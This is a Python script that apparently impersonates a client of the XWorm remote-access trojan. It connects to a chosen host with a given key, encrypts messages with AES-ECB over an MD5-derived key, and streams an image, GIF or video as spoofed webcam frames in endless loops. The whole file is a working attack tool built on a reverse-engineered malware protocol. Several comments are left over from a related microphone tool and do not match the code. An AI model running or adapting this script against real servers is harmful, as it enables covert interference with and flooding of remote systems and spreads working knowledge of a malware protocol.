
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from PIL import Image
import hashlib
import base64
import socket
import gzip
import time
import cv2
import io
import os

class CamSpoofingUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = CamSpoofingUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

    def compress(input_bytes: bytes) -> bytes:
        with io.BytesIO() as memory_stream: # Create memory stream
            memory_stream.write(len(input_bytes).to_bytes(4, byteorder='little')) # Write original length

            with gzip.GzipFile(fileobj=memory_stream, mode='wb') as gzip_file: # Create gzip file
                gzip_file.write(input_bytes) # Write input bytes to gzip file

            return memory_stream.getvalue() # Return compressed bytes


class CamSpoofing:
    SPL_XCLIENT = "<Xwormmm>"

    @staticmethod
    def main():
        host = input("Host > ") # Get target host
        port = input("Port > ") # Get target port
        key = input("Key > ") # Get encryption key
        sock = CamSpoofing.connection(host, port) # Connect to target
        image_path = input("Image/Video/Gif file path > ").strip().strip('"') # Get image file path

        allowed_exts = (
            ".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".tif", ".tif", ".ico", ".mp4", ".avi", ".mov", ".mkv"
        )

        if not os.path.exists(image_path) or not image_path.lower().endswith(tuple(allowed_exts)): # Validate audio file
            print("Image/Video/Gif file not found or invalid format.")
            os._exit(0)

        image_path = os.path.normpath(image_path) # Normalize path

        CamSpoofing.trigger(sock, key, image_path) # Trigger the Microphone


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def trigger(sock, key, image):
        try:
            payload =  f"WBCM{CamSpoofing.SPL_XCLIENT}Cam Name{CamSpoofing.SPL_XCLIENT}ClientID" 
            CamSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted message

            if image.lower().endswith(('.mp4', '.avi', '.mov', '.mkv')): # Video file handling
                cap = cv2.VideoCapture(image) # Open video file

                if not cap.isOpened(): # Check if video opened successfully
                    print("Cannot open video file.")
                    return

                while True:
                    ret, frame = cap.read() # Read frame
                    if not ret or frame is None: # Break if no frame is returned
                        cap.set(cv2.CAP_PROP_POS_FRAMES, 0) # Restart video
                        continue

                    frame = cv2.resize(frame, (256, 156)) # Resize frame
                    _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90]) # Encode frame as JPEG
                    compressed = CamSpoofingUtils.compress(buffer.tobytes()) # Compress frame
                    encoded_frame = base64.b64encode(compressed).decode("utf-8") # Base64 encode frame
                    
                    payload = f"Cam{CamSpoofing.SPL_XCLIENT}{encoded_frame}{CamSpoofing.SPL_XCLIENT}ClientID"
                    
                    CamSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted video frame

                    print("Video frame sent.")

                    time.sleep(1 / 144) # Sleep to control frame rate (up to 144 FPS)
            else:
                image = Image.open(image) # Open image file
                is_animated = getattr(image, "is_animated", False) # Check if image is animated

                if is_animated and image.format == "GIF":
                    while True:
                        frame_count = image.n_frames
                        for frame_index in range(frame_count): # Iterate through frames
                            image.seek(frame_index) # Seek to frame
                            frame = image.convert("RGB").resize((256, 156)) # Convert and resize frame

                            memory_stream = io.BytesIO() # Create memory stream
                            frame.save(memory_stream, format="JPEG", quality=90) # Save frame as JPEG
                            compressed = CamSpoofingUtils.compress(memory_stream.getvalue()) # Compress frame
                            encoded_image = base64.b64encode(compressed).decode("utf-8") # Encode to Base64

                            payload = f"Cam{CamSpoofing.SPL_XCLIENT}{encoded_image}{CamSpoofing.SPL_XCLIENT}ClientID"

                            CamSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted GIF frame
                            print("GIF frame sent.")

                            delay = image.info.get('duration', 100) / 1000.0 # Frame delay in seconds
                            time.sleep(delay) # Sleep for frame duration
                else:
                    if image.mode in ("RGBA", "P"): # Convert to RGB if necessary
                        image = image.convert("RGB") # Convert to RGB

                    resized = image.resize((256, 156)) # Resize image
                    memory_stream = io.BytesIO() # Create memory stream
                    resized.save(memory_stream, format="JPEG", quality=90) # Save image as JPEG
                    compressed = CamSpoofingUtils.compress(memory_stream.getvalue()) # Compress image
                    encoded_image = base64.b64encode(compressed).decode("utf-8") # Encode to Base64

                    payload = f"Cam{CamSpoofing.SPL_XCLIENT}{encoded_image}{CamSpoofing.SPL_XCLIENT}ClientID"

                    print("Image sent.") 
                    
                    while True:
                        CamSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted image

        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    CamSpoofing.main() # Run the main function